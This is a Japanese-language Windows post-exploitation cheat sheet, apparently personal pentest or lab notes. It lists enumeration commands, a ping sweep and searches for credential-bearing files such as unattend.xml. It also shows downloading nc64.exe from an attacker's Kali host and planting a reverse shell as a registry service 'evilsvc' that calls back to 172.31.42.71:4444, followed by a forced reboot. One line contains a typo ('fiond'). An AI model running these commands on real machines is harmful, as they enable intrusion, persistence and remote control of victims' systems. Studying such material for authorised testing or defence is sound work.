# windows command

* net XXX

``` bat
    # ユーザ情報
    net user
    または
    wmic USERACCOUNT Get Domain,Name,Sid
    # ログオンとかパスワード条件とか
    net accounts
    # ローカルグループ情報
    net localgroup
```

* tasklist

``` bat
    tasklist /SVC
```

* システム情報

```bat
    systeminfo
    または
    wmic computersystem LIST full
```

* マウント情報(共有ドライブとか)

``` bat
    mountvol
    共有ドライブ
    powershell -Command "Get-WmiObject -class Win32_Share"
```

* ping sweep

``` bat
    for /l %i in (1,1,255) do @ping -n 1 -w 100 XXX.XXX.XXX.%i | fiond "TTL="
```

* ファイル検索

``` bat
    dir /s *<file_name>*
    または
    wmic DATAFILE where "drive='C:' AND Name like '%<file_name>%'" GET Name,Readable,size /VALUE

    # 検索でよく使うファイルパターン
    *.txt/*.doc/*.xls/*.one/*.cnf/unattend.xml
```

* ファイル転送

``` powershell
    powershell -NoProfile -ExecutionPolicy unrestricted -Command (Invoke-WebRequest -Uri "http://<Remote KaliのIP>:8000/nc64.exe" -OutFile "nc64.exe")
```

* kaliにあるwindowsで実行可能なファイル
  
    `/usr/share/windows-binaries`

* windows reverse shell
  * windowsサービス

    ``` bat
        #wordpressから[nc.exe]をfile uploadする必要がある。
        reg add HKLM\SYSTEM\CurrentControlSet\Services\evilsvc /t REG_EXPAND_SZ /v ImagePath /d "cmd /c \"C:\inetpub\wwwroot\wordpress\wp-content\themes\twentytwenty\nc.exe 172.31.42.71 4444 -e cmd\"" /f

        #再起動できる場合は再起動
        shutdown /r /t 0
    ```

* サービス登録

  ``` batch
    # サービス登録コマンド
    # notepad.exeをシステム起動時に自動起動するサービスを登録するコマンド 
    sc create notepad binpath= "C:¥Windows¥system32¥notepad.exe" start=auto
    # 
    sc qc evilsvc
  ```
